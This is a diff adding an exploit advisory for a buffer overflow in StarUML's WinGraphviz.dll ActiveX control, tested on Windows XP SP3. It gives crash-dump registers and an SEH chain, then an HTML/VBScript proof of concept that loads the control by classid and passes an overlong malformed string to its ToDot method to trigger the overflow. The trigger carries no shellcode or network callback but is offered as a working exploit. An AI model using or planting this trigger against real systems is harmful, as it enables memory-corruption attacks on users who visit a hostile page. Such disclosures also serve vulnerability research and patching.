@@ -1,0 +1,62 @@
+# Exploit Title: StarUML WinGraphviz.dll ActiveX buffer overflow vulnerability
+# Date: 03.8.2013
+# Exploit Author: d3b4g
+# Vendor Homepage:http://staruml.sourceforge.net/en/
+# Software Link: http://staruml.sourceforge.net/en/
+# Tested on: Windows XP SP3
+ 
+ 
+
+About StarUML
+--------------
+
+StarUML is an open source project to develop fast, flexible, extensible, featureful, and freely-available UML/MDA platform running on Win32 platform. 
+
+
+
+
+ 
+Exception Code: ACCESS_VIOLATION
+Disasm: D98439	MOV DL,[EBP]	(WinGraphviz.DLL)
+
+Seh Chain:
+--------------------------------------------------
+1 	6B47D959 	VBSCRIPT.dll
+2 	772FE115 	ntdll.dll
+
+
+Called From                   Returns To                    
+--------------------------------------------------
+
+
+Registers:
+--------------------------------------------------
+EIP 00D98439 -> Asc: http://test\test\test\te?s\test\test\tes\ttest\tes
+EAX 00894119 -> Asc: http://test\test\test\te?s\test\test\tes\ttest\tes
+EBX 0020D70A -> 00000038
+ECX 00894119 -> Asc: http://test\test\test\te?s\test\test\tes\ttest\tes
+EDX 000003FF
+EDI 000003FE
+ESI 00000000
+EBP 00000000
+ESP 0020D618 -> 00000059
+
+
+
+The example code below triggers the vulnerability
+-------------------------------------------------
+
+
+<object classid='clsid:1F25D86C-95BC-4E33-A177-EE8DABEF8B04' id='target' />
+<script language='vbscript'>
+targetFile = "C:\Program Files\StarUML\WinGraphviz.dll"
+prototype  = "Function ToDot ( ByVal Source As String ) As String"
+memberName = "ToDot"
+progid     = "WINGRAPHVIZLib.NEATO"
+argCount   = 1
+
+arg1="http://test\test\test\te?s\test\test\tes\ttest\test\te@st\tes\test\test\tes.\ttest\test\test\tes\test\test\te.s\ttest\test\test\tes\test\test\tes\t\\\\\\\\\:#$%test\test\test\te?s\test\test\tes\\:#$%\ttest\test\te@st\tes\test\test\tes.\ttest\test\test\tes\test\test\te.s\ttest\test\test\tes\test\test\tes\t\\\\\\\\\:#$%test\test\test\te?s\test\test\tes\\:#$%\ttest\test\te@st\tes\test\test\tes.\ttest\test\test\tes\test\test\te.s\ttest\test\test\tes\test\test\tes\t\\\\\\\\\:#$%test\test\test\te?s\test\test\tes\\:#$%\ttest\test\te@st\tes\test\test\tes.\ttest\test\test\tes\test\test\te.s\ttest\test\test\tes\test\test\tes\t\\\\\\\"
+
+target.ToDot arg1 
+
+</script>
